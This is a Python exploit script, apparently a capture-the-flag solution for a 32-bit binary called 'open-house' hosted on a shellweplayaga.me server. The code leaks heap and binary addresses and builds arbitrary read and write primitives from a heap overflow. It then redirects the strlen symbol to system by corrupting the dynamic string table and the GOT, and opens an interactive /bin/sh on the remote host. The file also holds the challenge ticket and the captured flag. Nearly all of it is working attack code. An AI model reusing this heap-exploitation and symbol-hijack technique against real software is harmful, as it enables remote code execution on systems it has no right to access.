#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './open-house'
context(os = 'linux', arch = 'x86')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':'set debug-file-directory /usr/i686-linux-gnu/lib/debug'}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'open-house-6dvpeatmylgze.shellweplayaga.me', 'port':10001})
env.select()

#==========

binf = ELF(bin_file)
ofs_head            = 0x3164
ofs_dynstr          = binf.sep_section['.dynstr']
ofs_str_strlen      = next(binf.search(b'strlen\x00'))

#==========

def attack(conn, **kwargs):
    if env.check('remote'):
        conn.sendlineafter(b'Ticket please: ', b'ticket{RenovationUtilities4304n23:oVTjVxrl0NqE8Sq-r3zcpkNgIspMB3gx4WRTDoQ-piVSWJEb}')

    oh = OpenHouse(conn)

    oh.create(b'A'*0x200)
    oh.create(b'x')

    for _ in range(10):
        oh.delete(1)

    leak = oh.view()[0][0x200:]
    addr_heap, addr_head = u32(leak[:4]), u32(leak[4:])

    addr_heap_base = addr_heap-0x2860
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    binf.address = addr_head - ofs_head
    info('addr_bin_base     = 0x{:08x}'.format(binf.address))
    addr_bss            = binf.sep_section['.bss']
    addr_strtab         = binf.address + 0x3048
    addr_got_strlen     = binf.got['strlen']
    addr_plt_strlen     = binf.plt['strlen']

    '''
    addr_gotplt         = binf.sep_section['.got.plt']
    addr_link_map = u32(aar(oh, addr_gotplt+4)[:4])
    info('addr_link_map     = 0x{:08x}'.format(addr_link_map))

    bin_map = LinkMap(addr_link_map)
    addr_strtab = u32(aar(oh, bin_map.l_info['DT_STRTAB'])[:4])
    '''

    ofs_strtab_strlen   = ofs_str_strlen - ofs_dynstr
    aaw(oh, addr_strtab + 4, p32(addr_bss - ofs_strtab_strlen))
    aaw(oh, addr_bss, b'system\x00')
    aaw(oh, addr_got_strlen, p32(addr_plt_strlen+6))

    oh.create(b'/bin/sh\x00')

def aar(oh, addr):
    # oh.modify(1, b'X'*0x200+flat(addr)+flat(addr_head))
    oh.modify(1, b'X'*0x200+flat(addr))
    return oh.view()[1]

def aaw(oh, addr, data):
    oh.modify(1, b'X'*0x200+flat(addr))
    oh.modify(2, data)

class OpenHouse:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def create(self, review):
        self.sendlineafter(b'>', b'c')
        self.sendline(review)

    def view(self):
        self.sendlineafter(b'>', b'v')
        self.recvuntil(b'**** - ')
        res = self.recvuntil(b'\nc|v', drop=True)
        return res.split(b'\n**** - ')

    def modify(self, idx, review):
        self.sendlineafter(b'>', b'm')
        self.sendlineafter(b'?\n', str(idx).encode())
        self.sendlineafter(b'?\n', review)

    def delete(self, idx):
        self.sendlineafter(b'>', b'd')
        self.sendlineafter(b'?', str(idx).encode())

    def quit(self):
        self.sendlineafter(b'>', b'q')

class LinkMap:
    def __init__(self, addr):
        info_tag = {'DT_STRTAB':5, 'DT_SYMTAB':6, 'DT_JMPREL':23}

        self.l_addr        = addr
        self.l_info        = { k: addr+0x20+4*v for (k,v) in info_tag.items() }

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # flag{RenovationUtilities4304n23:Ajlp3_-KKRVt7kWeYoi1ihl0qn5hVX5PeF1bTEVFQuFmtsqmPMQtzxz9xHO2MYXj07tiv8V-XHAxohOZdYf_wg}

if __name__=='__main__':
    main()

#==========
